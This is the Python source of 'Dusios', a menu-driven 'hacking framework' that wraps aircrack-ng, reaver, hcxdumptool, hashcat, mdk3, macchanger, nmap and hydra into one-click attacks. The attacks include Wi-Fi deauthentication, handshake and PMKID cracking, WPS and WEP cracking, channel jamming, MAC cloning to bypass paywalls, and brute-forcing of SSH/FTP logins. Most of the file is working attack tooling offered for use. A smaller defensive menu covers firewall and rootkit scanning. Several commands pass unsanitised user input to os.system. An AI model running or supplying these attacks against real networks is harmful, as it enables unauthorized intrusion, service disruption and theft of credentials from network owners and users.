#Dusios
# A wifi /router cracking tool, designed to speed up basic commands via nav menu
#Designed By Duncan Andrews

#shebanf
#!/bin/bash

#Libraries
try:
	import subprocess

	import os

	import os.path
	
	import fnmatch
	
	import csv
	
	import pandas as pd
	
	import requests
	

except:
	print("you seem to be missing some libraries")

	
#GLOBAL VARIBLES
BSSID = " "




#Check Profile Settings
interface = 'wlp5s0'
INTERFACE= ''
CLIENT= " "
CHANNEL= 0
COUNT = 50
#shows commands 0 is off 1 is on
advanceMode= 0

#Pause Function
def Pause():
	pase = raw_input("Press Enter.. ")
	return

#prints banner and clears screen
def Banner():
#Prints banner and clear screen at each new page
	#clear screen
	global interface
	global user
	global advanceMode
	global INTERFACE
	os.system('cls' if os.name == 'nt' else 'clear')
	
	aStatus = "Off"
	#check the advance mode setting
	if advanceMode == '1':
		aStatus = "On "
	iStatus = "Off"
	#check if monitor mode is enabled
	if INTERFACE:
		iStatus = "On "		

	os.system("hostname")
	print("Interface = " + interface + " || Monitor mode = " + iStatus + " || Adv-Mode = "+ aStatus)
	print(" ______________________________________________________________")
	print(" _____  _    _  _____ _____ ____   _____     ") 
	print("|  __ \| |  | |/ ____|_   _/ __ \ / ____|    ")
	print("| |  | | |  | | (___   | || |  | | (____")
	print("| |  | | |  | |\___ \  | || |  | |\___  |")
	print("| |__| | |__| |____) |_| || |__| |____) /")
	print("|_____/ \____/|_____/|_____\____/|_____/ ")
	print(" ---------HACKING FRAMEWORK Version 10.0-----------------------")
	print(" ______________________________________________________________")

                             
     
	#return to function that called
	return

#exit splash screen and auto return to non monitor mode
def exitSplash():
	os.system("sudo airmon-ng stop " + INTERFACE )
	os.system("sudo ip link set " + interface + " up")
	Banner()
	print("      ________________")
	print("     /                \"")
	print("    / /          \ \   \"")
	print("    |                  |")
	print("   /                  /")
	print("  |      ___\ \| | / /")
	print("  |      /          \"")
	print("  |      |           \"")
	print(" /       |      _    |")
	print(" |       |       \   |")
	print(" |       |       _\ /|     I am Corn Julio!!! I need TP for my")
	print(" |      __\     <_o)\o-    bunghole!!!! Where we come from we")
	print(" |     |             \     have no bungholes...Would you like")
	print("  \    ||             \    to be my bunghole?")
	print("   |   |__          _  \    /")
	print("   |   |           (*___)  /")
	print("   |   |       _     |    /")
	print("   |   |    //_______/")
	print("   |  /       | UUUUU__")
	print("    \|        \_nnnnnn_\-\"")
	print("     |       ____________/")
	print("     |      /")
	print("     |_____/")

	quit()

#Runs startup and sets up folders
def start():
	Banner()
#	global user
#	global interface
#	global userAlert
#	#with open('profile.txt', 'r') as file:
#	#	data = file.read().replace('\n', '')
#		#file = open("profile.txt", 'r')
#	#	file.close()
#	file = open("profile.txt", "rw")
#	lines = file.readlines()
#		#strip whit space and line breaks
#	interface = lines[1]
#	user = lines[0]
#	print(user)
#	print(interface)
#	file.close()
#	pause = raw_input("hmmm")
#	if user == "n/a":
	print("This is your first time running Dusios in this Folder!")
	print("Creating folders...")
	os.system("mkdir handShakes; mkdir PasswordLists; mkdir UsernameLists")
	print("Folders created!")
	Pause()
	f = open('profile.txt', 'w+')
	Banner()
	name= raw_input("Enter your name or Handle: ")
	f.write(name + "\n")
	print("USABLE NETWORK INTERFACES")
	os.system("ip link show")
	interface = raw_input("Enter interface of choice, if you are not sure you can always change this in the '[3]. Change Wifi interface' option in the 'WiFi Home' menu: ")
	f.write(interface)
	f.close()
	Banner()
	print("If this is your first time using Dusios on your computer you should select '[6]. Install Necessary Libraries' from the next menu")
	print("THis will also fill the new PasswordLists and UsernameLists folders with .txt list files")
	Pause()
	print("If you need help you can find tutorials in the '[4]. How to & Info' option in the next menu, but make sure you have the Readme.txt ")
	print("Happy Hacking!")
	Pause()
	Home()

#internal readme reader
def Library(x,y):
	Banner()
	startL = x*1
	endL = y*1
#	os.system("sudo sed -n 1,9p Readme.txt")
	os.system("sed -n " + str(startL) + "," + str(endL) + "p  Readme.txt")
	Pause()
	return

#read and print relevent from .csv file
def csvRead():
	Banner()
	import pandas as pd
	df = pd.read_csv(r'./wifiNetworks-01.csv')
	#print(data)
	#df = pd.DataFrame(data, columns= [' ESSID','BSSID',' channel' ])
	import numpy as np
	df1 = df.replace(np.nan, '', regex=True)
	print(df1)

	Pause()
	return

#sets router to monitor mode
def Monitor():
#Turns wifi interface on to monitor mode
	Banner()
	#Call Global variables
	global interface
	global INTERFACE
	print("Default WiFi interface set to: " + INTERFACE)
	global advanceMode
	if advanceMode == '1':
		command = "sudo airmon-ng start " + interface
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo airmon-ng start " + interface)
	INTERFACE = interface + "mon"
	print INTERFACE
	Pause()
	return

#show wifi networks in the area
def Networks():
#Shows current networks in area after monitor mode enabled
	Banner()
	#global varibles
	global INTERFACE
	#Delete old file
	if os.path.exists("wifiNetworks-01.csv"):
		os.remove("wifiNetworks-01.csv")
	print ("Press CTRL + C to stop Scan")
	global advanceMode
	if advanceMode == '1':
		command = "sudo airodump-ng --wps -w wifiNetworks --output-format txt " + INTERFACE
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo airodump-ng --wps -w wifiNetworks --output-format txt " + INTERFACE)
	print("Network imformation gathered! ENter 'v' on the menu any time to view Captured Info")
	Pause()
	return

#pkmid attack
def Pkmid():
	Banner()
	global INTERFACE
	global advanceMode
	#delete duplicate files
	
	print("Let this run for a few minutes")
	if os.path.exists("galleria.pcapng"):
			os.remove("galleria.pcapng")
	if os.path.exists("galleriaHC.16800"):
			os.remove("galleriaHC.16800")		
	if advanceMode == '1':
		command = "sudo hcxdumptool -i " +INTERFACE+ " -o galleria.pcapng "
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo hcxdumptool -i " +INTERFACE+ " -o galleria.pcapng ")
	print("pKmID imformation gathered! ")
	os.system(" sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng")


	Pause()
	return
	
#pkmid crack
def pCrack():
	Banner()
	print("Files: ")
	listOfFiles = os.listdir('./PasswordLists')
	pattern = "*.txt"
	for entry in listOfFiles:
		if fnmatch.fnmatch(entry, pattern):
			print(entry)

#Prompt for file name and directtory name
	filename= input("Enter Password File Name SUROUNDED BY QOUTES!!: ")
	os.system("sudo hashcat -m 16800 galleriaHC.16800 -a 0  --force './PasswordLists/"+filename+"'")
	Pause()
	return
	
#actual send of deauth 
def DeauthAttack():
#actual DeauthAttack
	global COUNT
	global BSSID
	global CLIENT
	global INTERFACE

	global advanceMode
	if advanceMode == '1':
		command = "sudo aireplay-ng -0 " + COUNT + " -a " +  BSSID + " -c " + CLIENT + " " + INTERFACE
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo aireplay-ng -0 " + COUNT + " -a " +  BSSID + " -c " + CLIENT + " " + INTERFACE)
	#tester = " -C white"
	#os.system("sudo cmatrix" + tester)
	#os.system
	again = raw_input("Would you like to attempt another attack? y/n :  ")
	if again:
		if again == 'y':
			DeauthAttack()
		if again == 'n':
			Deauth()
	else:
		Deauth()

	return

#sets deauth options
def Deauth():
#Deauth attack Options
	Banner()
	#call global varibles
	global BSSID
	global CLIENT
	global COUNT

	print("[1]. Set target")
	print("[2]. Deauth Attack")
	print("[3]. Return")

	choice = raw_input("Enter Choice: ")
	if choice:
		if choice == '1':
			BSSID = raw_input("Type in the BSSID that you want to use(this should be to the left of the router name) ie. 84:1b:5E:E4:D6:K9: ")
			CLIENT = raw_input("Target Client or station device MAC id  ie. 84:1b:5E:E4:D6:K9 (differnt from router: ")
			COUNT = raw_input("What amount of Deauth attempts would you like? (recomend 50 min): ")

			#try to Deauth attack
			DeauthAttack()
		if choice == '2':
			DeauthAttack()
	else:
		Deauth()

#captures 4way handshake
def HandShake():
#Listen for handshakes
	Banner()
	#call global varibles
	global BSSID
	global CHANNEL
	global INTERFACE
	BSSID = raw_input("Type in the BSSID that you want to use(this should be to the left of the router name) ie. 84:1b:5E:E4:D6:K9: ")
	CHANNEL = raw_input("Type in the channel of that BSSID: ")
	
	global advanceMode
	if advanceMode == '1':
		command = "sudo airodump-ng -c " + CHANNEL + " --bssid " + BSSID + " -w ./handShakes/ " + INTERFACE
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo airodump-ng -c " + CHANNEL + " --bssid " + BSSID + " -w ./handShakes/ " + INTERFACE)
	Pause()
	return

#use hashcat to crack passwords etc
def Crack():
	Banner()
	print("----------Working Directory Files ")
    #list files in working directory
	print("Files: ")
	listOfFiles = os.listdir('./PasswordLists')
	pattern = "*"
	for entry in listOfFiles:
		if fnmatch.fnmatch(entry, pattern):
			print(entry)

#Prompt for file name and directtory name
	filename= input("Enter Password File Name SUROUNDED BY QOUTES!! : ")
	if filename:
		print("Files: ")
		listOfFiles = os.listdir('./handShakes')
		pattern = "*.cap"
		for entry in listOfFiles:
			if fnmatch.fnmatch(entry, pattern):
				print(entry)
		name = raw_input("Enter name of .cap file ie. '0986.cp' : ")
	global advanceMode
	if advanceMode == '1':
		command = "sudo aircrack-ng ./handShakes/" + name + " -w ./PasswordLists/" +"'" + filename + "'"
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo aircrack-ng ./handShakes/" + name + " -w ./PasswordLists/" +"'" + filename + "'")
	Pause()
	return

#RETURN THE WIRELESS DEVICE TO ITS NON MONITORMODE
def Revert():
	Banner()
	global INTERFACE
	print(INTERFACE)
	global advanceMode
	if advanceMode == '1':
		command = "sudo airmon-ng stop " + INTERFACE 
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo airmon-ng stop " + INTERFACE )
	if advanceMode == '1':
		command = "sudo ip link set " + interface + " up"
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo ip link set " + interface + " up")
		
	#set flag for monitor  off and reset value
	INTERFACE = ''
	Pause()
	return

#CHANGE THE DEFAULT INTERFACE BEING USED FOR MONITOR MODE
def Change():
	Banner()
	#call global variables
	global interface
	global INTERFACE

	print("USABLE NETWORK INTERFACES")
	os.system("ip link show")
	interface = raw_input("Enter interface of choice: ")
	rename = raw_input("Would you like to set interface into monitoring mode? y/n:")
	if rename:
		if rename == 'y':
			#INTERFACE = interface + "mon"
			Monitor()
	return

#using reaver
def Reaver():
	Banner()
	global INTERFACE
	print("Reaver is a WPS based hack which required WPS on the target router. When view networks make sure under WPS it say 1.0 and your card is in monitor mode")
	BSSID = raw_input("Type in the BSSID that you want to use(this should be to the left of the router name) ie. 84:1b:5E:E4:D6:K9: ")
	if BSSID:
		choice = raw_input("Would you like to conduct a Pixie Attack (a quick common pin check)? y/n: ")
		if choice:
			if choice == 'y':
				#-S, --dh-small   Use small DH keys to improve crack speed
				#-w, --win7       Mimic a Windows 7 registrar
				print("This may take some time. Press ctrl+c to stop operation")
				global advanceMode
				if advanceMode == '1':
					command = "sudo reaver -i " + INTERFACE + " -b " + BSSID +" -l 2 -d 2 -S -N -w -vv"
					new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
					if new:
						os.system(new)
					else:
						os.system(command)
				else:
					os.system("sudo reaver -i " + INTERFACE + " -b " + BSSID +" -l 2 -d 2 -S -N -w -vv")
			else:
				print("This may take some time. Press ctrl+c to stop operation")
				if advanceMode == '1':
					command = "sudo reaver -i " + INTERFACE + " -b " + BSSID +" -l 2 -d 2 -N -w -vv"
					new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
					if new:
						os.system(new)
					else:
						os.system(command)
				else:
					os.system("sudo reaver -i " + INTERFACE + " -b " + BSSID +" -l 2 -d 2 -N -w -vv")
	Pause()
	return		

#cracking wep networks
def WEP():
	Banner()
	global INTERFACE
	
	print("WEP is relativly quick but can take up to 25 mins, If there is an Error try again")
	BSSID = raw_input("ENter the BSSID of the router or AP: ")
	channel = raw_input("Enter Channel of BSSID target: ")
	global advanceMode
	if advanceMode == '1':
		command = "sudo besside-ng " + INTERFACE + " -c " + channel + " -b " + BSSID
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo besside-ng " + INTERFACE + " -c " + channel + " -b " + BSSID)
	print("This is the password in HEX, choose the number of the network you just cracked to see in plaintext")
	os.system("sudo aircrack-ng ./wep.cap")
	Pause()
	return
	
#flood the channel of choice
def Mdk():
	Banner()
	global INTERFACE
	cha = raw_input("Enter the name of the Channel you wish to jam: ")
	print("Flooding channel: "+ cha + " To stop attack Press ctrl+c")
	global advanceMode
	if advanceMode == '1':
		command = "sudo mdk3 " + INTERFACE + " d -c " + cha
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo mdk3 " + INTERFACE + " d -c " + cha)
	Pause()
	return

#change or clone mac address
def MAC():
	Banner()
	global interface
	print("Default WiFi interface set to: " + interface)
	os.system("sudo macchanger -s "+ interface)
	print("Change your MAC or Clone another on the network to Bypass Wifi login")
	print("MAke sure your Wireless card is correct!!")
	os.system("sudo ifconfig " + interface + " down")
	choice = raw_input("Enter MAC to clone or leave Blank to randomize: ")
	if choice:
		os.system("sudo macchanger -m " + choice + " " + interface)
	else:
		os.system("sudo macchanger -r " + interface)
	os.system("sudo ifconfig " + interface + " up")
	Pause()
	return


	



#----------------------------------------------------------------------------------------------------------------------------
def Scan():
	Banner()
	print("Your Subnet ip: ")
	os.system("ip -o -f inet addr show | awk '/scope global/ {print $4}'")
	print('----------------------------------')
	target = raw_input("Enter address to scan (copy & paste the above address for local network): ")
	print("------Machines on your Network")
	#sub = os.system("ip -o -f inet addr show | awk '/scope global/ {print $4}'")
	#print(sub)
	#this part should id the subnet and do an n,ap scan
	#string = os.system("sudo nmap -sL " + "ip -o -f inet addr show | awk '/scope global/ {print $4}'")
	global advanceMode
	if advanceMode == '1':
		command = "sudo nmap -oN scan.txt -sL " + target + " -v0"
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo nmap -oN scan.txt -sL " + target + " -v0")
	count = len(open("scan.txt",'r').readlines(  ))
	count -=2
	#print(count)
	file = open("scan.txt", 'r')
	fileLines = file.readlines()
	file.close()
	#print(fileLines[3])
	#check lines for relevant info
	x=0
	while x < count:
		info = str(fileLines[x])
		if info.count('(')== 1:
			print("Target: " + info[20:])
			x +=1
		else:
			x += 1
	count +=1
	print(fileLines[count])
	#print(count)
	
	
	Pause()
	return

def Port():
	Banner()
	ip = raw_input("Enter Target ip: ")
	global advanceMode
	if advanceMode == '1':
		command = "sudo nmap  -A " + ip + "; sudo nmap  -F " + ip
		new=  raw_input("System command about to use:***** " + command + " ***** Enter edited command or leave blank to excute as is: ")
		if new:
			os.system(new)
		else:
			os.system(command)
	else:
		os.system("sudo nmap  -A " + ip)
		os.system("sudo nmap  -F " + ip)
	Pause()
	return
	
	




def Brute():
	Banner()
	uList = "-L "
	pList = "-P "
	print("Brute Forcing ports via Lists, if you know the username or password for the target type it in.")
	print("If you dont know the username or password, leave the prompt blank and hit ENTER to select from a list.")
	port = raw_input("Port number: ")
	user = raw_input("Known username or leave blank to choose list: ")
	if user:
			user = user
			uList = uList.replace("L","l")
	else:	
		print("------Files---------------------------: ")
		listOfFiles = os.listdir('./UsernameLists')			
		pattern = "*.txt"
		for entry in listOfFiles:
			if fnmatch.fnmatch(entry, pattern):
				print(entry)
		user = " ./UsernameLists/" + raw_input("Enter USer file name: ")
		
	password = raw_input("Known password or leave blank to choose list: ")
	if password:
		password = password
		pList = pList.replace("P","p")
	else:	
		print("------Files---------------------------- ")
		listOfFiles = os.listdir('./PasswordLists')			
		pattern = "*.txt"
		for entry in listOfFiles:
			if fnmatch.fnmatch(entry, pattern):
				print(entry)
		password = " ./PasswordLists/" + raw_input("Enter Password file namme: ")
	ip = raw_input("Enter IP: ")
	interface = raw_input("Enter Interface FTP, SHH: ")
	os.system("sudo hydra -s " + port + " " + uList + user + " " + pList + password + " " + interface + "://" + ip + " -V -t 8")   
	Pause()
	return
					#network testing pen test
	
#show failed log attempts
def Log():
	Banner()
	print("Showing failed login attemps to your Computer")
	os.system("cat /var/log/auth.log | grep 'Failed password'")
	Pause()
	return

def Net():
	Banner()
	#List options
	print("Target Home")
	print("------Your Subnet ip: ")
	os.system("ip -o -f inet addr show | awk '/scope global/ {print $4}'")
	print("------Recon & Information Gathering-")
	print("[1]. Scan your LAN or Subnet")
	print("[2]. Port Scan Target Machine")
	print("[3]. BruteForce port")
	print("[q]. Return")
	choice = raw_input("Enter Choice: ")
	if choice:
		if choice == '1':
			Scan()
		if choice == '2':
			Port()
		if choice == '3':
			Brute()
		if choice == 'q':
			return
		else:
			Net()
	else:
		Net()
	return
	
def Connections():
	Banner()
	print("Open ports on your Computer")
	os.system("sudo ufw status")
	Pause()
	return

#enable firewall
def FireWall():
	Banner()
	print("BasicFireWall Setup------")
	choice= raw_input("Would you like to Enable or Disable a FireWall? (e/d):")
	if choice:
		if choice == 'e':
			print("Enabling Firewall with Basic Settings...")
			os.system("sudo ufw default deny incoming")
			os.system("sudo ufw default allow outgoing")
			print("Allowing HTTP and HTTPS Basic internet connections")
			os.system("sudo ufw allow 80")
			os.system("sudo ufw allow 443")
			os.system("sudo ufw enable")
			Pause()
		if choice =='d':
			os.system("sudo ufw disable")
			Pause()
		else:
			return
	else:
		return
	print("All Done!")
	os.system("sudo ufw status")
	Pause()
	return


#Edit firewall options
def EditFire():
	Banner()
	os.system("sudo ufw status")
	command = raw_input("To open connections type 'allow' plus port number, ie 'add 22' type 'deny' plus port number to close that port, To delete a setting type 'del' before typing 'allow' or 'deny': ")
	os.system("sudo ufw " + command)
	Pause()

#USe the noisy python program
def Noisy():
	Banner()
	print("Created by Itay Hury. This floods your ISP with so much random")
	print("HTTP/DNS noise that your data is useless to anyone even if they do get it.")
	print("YOu can Run tHis over night if you like ")
	print("Starting Noisy... Use ctrl+c to stop")
	print("Custom list used made by Nullbyte.com (good Peoples)")
	os.system("sudo python ./noisy/noisy.py --config custom_list.json")
	Pause()
	return

#use the anon profile manager
def Anon():
	Banner()
	os.system("sudo python ./Anon/Master.py")
	Pause()
	return

#scan computer with chkrootkit
def chk():
	Banner()
	print("Chkrootkit is a tool to locally check for signs of a rootkit. It contains:")
	print("chkrootkit: shell script that checks system binaries for rootkit modification.")
	print("ifpromisc.c: checks if the interface is in promiscuous mode.")
	print("chklastlog.c: checks for lastlog deletions.")
	print("chkwtmp.c: checks for wtmp deletions.")
	print("check_wtmpx.c: checks for wtmpx deletions. (Solaris only)")
	print("chkproc.c: checks for signs of LKM trojans.")
	print("chkdirs.c: checks for signs of LKM trojans.")
	print("strings.c: quick and dirty strings replacement.")
	print("chkutmp.c: checks for utmp deletions.")
	Pause()
	os.system("sudo chkrootkit")
	Pause()
	return


#use rk hunter to check for root kits
def rkhunter():
	Banner()
	print("rkhunter (Rootkit Hunter) is a Unix-based tool that scans for rootkits, backdoors and possible local exploits. It does this by comparing SHA-1 hashes of important files with known good ones in online databases, searching for default directories (of rootkits), wrong permissions, hidden files, suspicious strings in kernel modules, and special tests for Linux and FreeBSD.")
	Pause()
	os.system("sudo rkhunter -c")
	Pause()
	return


#change your host name
def hostname():
	Banner()
	#file = open("profile.txt", "rw")
	#lines = file.readlines()
	#name = lines[0]
	name = raw_input("Enter new hostname: ")
	os.system("sudo hostname "+ name)
	Pause()
	return

#MAKE NEW PROFILE TEXT FILE WITH PREFERNCES
def Profile():
	Banner()
	global interface
	global advanceMode
	print("Welcome to Advance Setup!")
	advanceMode= raw_input("Turn on Advance Command & Debug mode? '1'for on '0' for off: ")
	Pause()
	return


def Wifi():
	Banner()
	#List options
	print("WiFi Home")
	print("------Setup & Recon----------------")
	print("[1]. Set wifi adapter to Monitor mode")
	print("[2]. View active networks in the area")
	print("[3]. Change Wifi interface")
	print("[4]. Set wifi adapter back to normal")
	print("------WPA/WPA2 HandShake Exploit---")
	print("[5]. Deauth Attack")
	print("[6]. Capture Handshake")
	print("[7]. Crack Handshake")
	print("------WPS Reaver Exploit-----------")
	print("[8]. WPS Reaver attack: ")
	print("[9]. Jam/Flood Channel: ")
	print("------WEP Cracking with Besside-ng-")
	print("[10]. WEP cracking")
	print("------MAC Options------------------")
	print("[11]. Clone MAC address")
	print("------PMKID Exploit----------------")
	print("[12]. PMKID Capture ")
	print("[13]. PMKID Crack ")
	print("-----------------------------------")
	print("[v]. View Captured Networks")
	print("[q]. Return")
	choice = raw_input("ENter CHoice: ")
	if choice:
		if choice == '1':
			Monitor()
		if choice == '2':
			Networks()
		if choice == '3':
			Change()
		if choice == '4':
			Revert()
		if choice == '5':
			Deauth()
		if choice == '6':
			HandShake()
		if choice == '7':
			Crack()
		if choice == '8':
			Reaver()
		if choice == '9':
			Mdk()
		if choice == '10':
			WEP()
		if choice == '11':
			MAC()		
		if choice == '12':
			Pkmid()
		if choice == '13':
			pCrack()
		if choice == 'q':
			Home()
		if choice == 'v':
			csvRead()

	else:
		Wifi()
	Wifi()



	#Anonimize, Secure, and Defend Anonimize, Secure, and Defend
def Defense():
	Banner()
	#List options
	print("Anonymize, Secure, and Defend Home")
	print("------FIREWALL----------------")
	print("[1]. Enable/Disable FIreWall (UFW)")
	print("[2]. cHECK Firewall Status")
	print("[3]. Add Delete Edit FireWall")
	print("[4]. Check Fail Log attemps")
	print("------ONlinE ObfuscaTioN-------")
	print("[5]. Flood your ISP with Random Data to Protect Privacy")
	print("[6]. Anon Online Profile Manager (NOT AVAILBLE RIGHT NOW SORRY)")
	print("[7]. Change computer HostName")
	print("------ScAn COmpUter -----------")
	print("[8]. Scan Computer with chkrootkit")
	print("[9]. Advance Scan with rkhunter")
	print("[q]. Return")
	choice = raw_input("Enter Choice: ")
	if choice:
		if choice == '1':
			FireWall()
		if choice == '2':
			Connections()
		if choice == '3':
			EditFire()
		if choice == '4':
			Log()
		if choice == '5':
			Noisy()
		if choice == '6':
			Anon()
		if choice == '7':
			hostname()
		if choice == '8':
			chk()
		if choice == '9':
			rkhunter()
		if choice == 'q':
			return
		else:
			Defense()
	else:
		Defense()
	return
	

	#showwws how tos and info
def Readme():
	Banner()
	x =0
	y = 0
#	print(file.read())
	print("------Welcome to the Library! Select an Chapter")
	print("[1]. Welcome")
	print("[2]. FAQ")
	print("[3]. Install")
	print("[4]. Updating Your Computer!")
	print("[5]. Choosing your Wifi Interface")
	print("[6]. Advance User Mode")
	print("[7]. Setting up your WiFi card")
	print("[8]. View Networks around you")
	print("[9]. Choosing a Target and an Attack")
	print("[10]. WPA/WPA2 Capturing Handshakes to Crack")
	print("[11]. WPS/WPA Reaver AttacK")
	print("[12]. WEP Cracking")
	print("[13]. Cloning MAC to bypass paywalls")
	print("[14]. PMKID Cracking")
	print("[15]. Target Computer Recon and SUBNETS")
	print("[16]. How to Scan your Network for Targets")
	print("[17]. Port Scanning and Find holes to Attack in Target MAchine")
	print("[18]. BruteForcing Ports and Services")
	print("[19]. FIREWALL and Keeping yourself Safe")
	print("[20]. Obfuscate Your internet History with NOISY")
	print("[21]. RootKits, what they are, and how to check for them")
	choice= raw_input("Enter choice: ")
	if choice:
		if choice == '1':
			x = 1
			y= 17
			Library(x,y)
		if choice == '2':
			x = 20
			y= 40
			Library(x,y)
		if choice == '3':
			x = 43
			y= 61
			Library(x,y)
		if choice == '4':
			x = 63
			y= 69
			Library(x,y)
		if choice == '5':
			x = 71
			y= 79
			Library(x,y)
		if choice == '6':
			x = 81
			y = 96
			Library(x,y)
		if choice == '7':
			x = 98
			y= 104
			Library(x,y)
		if choice == '8':
			x = 106
			y= 201
			Library(x,y)
		if choice == '9':
			x = 204
			y= 227
			Library(x,y)
		if choice == '10':
			x = 229
			y= 267
			Library(x,y)
		if choice == '11':
			x = 269
			y= 291
			Library(x,y)
		if choice == '12':
			x = 294
			y= 318
			Library(x,y)
		if choice == '13':
			x = 320
			y= 366
			Library(x,y)
		if choice == '14':
			x = 368
			y= 394
			Library(x,y)
		if choice == '15':
			x = 396
			y= 433
			Library(x,y)
		if choice == '16':
			x = 436
			y= 447
			Library(x,y)
		if choice == '17':
			x = 450
			y = 491
			Library(x,y)
		if choice == '18':
			x = 494
			y= 502
			Library(x,y)
		if choice == '19':
			x = 506
			y= 515
			Library(x,y)
		if choice == '20':
			x = 517
			y= 527
			Library(x,y)
		if choice == '21':
			x = 529
			y= 552
			Library(x,y)
		if choice == 'q':
			return
		else:
			Readme()
	else:
		return
	
	Readme()
	return
#Downloads Password lists
def Passwords():
	Banner()
	#List options
	print("Password and User Lists Home")
	print("------Files---------------------------- ")
	listOfFiles = os.listdir('./PasswordLists')			
	pattern = "*.txt"
	for entry in listOfFiles:
		if fnmatch.fnmatch(entry, pattern):
			print(entry)
	choice = raw_input("Type p and Hit enter to update password list files or leave blank to go back to the Main MenU: ")
	#choice = string.lower(choice)
	if choice == 'p':
			
				#download PAssword Lists
		list = ["https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
				"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
			   "https://crackstation.net/files/crackstation-human-only.txt.gz"]
			
		for i in list:
			try:
				url = i
				print("Atempting to download password list from: " + i + "...")
				r = requests.get(url, allow_redirects=True)
				#make new name file 
				open("./PasswordLists/" + i[-20:], 'wb').write(r.content)
				print("list: " + i + " Downloaded!")
			except:
				print("Something did'nt quite work, you can always manually download list files and put them in the PasswordLists folder")
				Pause()
				pass
				
	else:
		return
	Pause()
	return


#Installs neccasry libries
def Lib():
	Banner()
	print("If this is your first time using Dusios then you will want to make sure you install required software")
	choice = raw_input("Do you want to update and install Libraries? This may take some time y/n:")
	if choice:
		if choice == 'y':
			os.system("sudo apt-get update && sudo apt-get upgrade")
			os.system("sudo apt install aircrack-ng reaver")
			os.system("sudo apt install mdk3")
			os.system("sudo apt install hashcat")
			os.system("sudo apt install hydra-gtk")
			os.system("sudo apt install nmap")
			os.system("sudo apt install ufw")
			os.system("sudo apt install iptables ")
			os.system("sudo apt install python3-pip")
			os.system("sudo apt install python2-pip")
			os.system("sudo apt install macchanger")
			os.system("sudo apt install net-tools")
			os.system("sudo apt install python-pip")
			os.system("sudo apt install chkrootkit")
			os.system("sudo apt install rkhunter")
			
			#install pkmid tools
			os.system("sudo apt install git")
			os.system("sudo git clone https://github.com/ZerBea/hcxdumptool")
			os.system("sudo apt-get install libcurl4-openssl-dev")
			os.system("sudo apt-get install libssl-dev")
			os.system("(cd hcxdumptool && sudo make && sudo make install)")
			os.system("sudo git clone https://github.com/ZerBea/hcxtools")
			os.system("(cd hcxtools && sudo make && sudo make install)")
			os.system("git clone https://github.com/warecrer/Hcxpcaptool")
			os.system("(cd Hcxpcaptool && sudo make && sudo make install)")
			
					  
			#installl python packages
			os.system("sudo pip install requests")
			os.system("sudo pip install json")
			os.system("sudo pip install random")
			os.system("sudo pip install fnmatch")
			os.system("sudo pip install Crypto")
			os.system("sudo pip install Cryptograpy")
			os.system("sudo pip install pandas")
			
			#install noisy and custom nullbyte list of websites
			os.system("sudo git clone https://github.com/1tayH/noisy.git")
			url = "https://raw.githubusercontent.com/holdTheDoorHoid/NoisyConfigg/master/config.json"
			print("Atempting to download website list from: " + url + "...")
			r = requests.get(url, allow_redirects=True)
			#make new name file 
			open("custom_list.json", 'wb').write(r.content)
			print("list Downloaded!")
			
			#run Password list downloads
			Passwords()
			
			print("Finished!")
			Pause()
			return
	return
			
			
		
	

def Home():
	#check the profile page
	global interface
	#read the Profile File
# Using readlines()
	profile = open('profile.txt', 'r')
	ProfileText = profile.readlines()
	interface = ProfileText[1]
	
	
	
	#List Options
	Banner()	
	print("Top Menu")
	print("[1]. Wifi Hacks")
	print("[2]. Device finding and Attacking")
	print("[3]. Anonymize, Secure, and Defend")
	print("[4]. How to & Info")
	print("[5]. Advance Options ")
	print("[6]. Install Necessary Libraries")
	print("[q]. Quit")
	choice = raw_input("ENter CHoice: ")
	if choice:
		if choice == '1':
			Wifi()
		if choice == '2':
			Net()
		if choice == '3':
			Defense()
		if choice == '4':
			Readme()
		if choice == '5':
			Profile()
		if choice == '6':
			Lib()
		if choice == 'p':
			Passwords()
		if choice == 'q':
			Banner()
			exitSplash()
	else:
		Home()
	Home()

	
	
#check to see if this is the first time you've run program
if os.path.exists("profile.txt"):
	Home()
else:
	start()



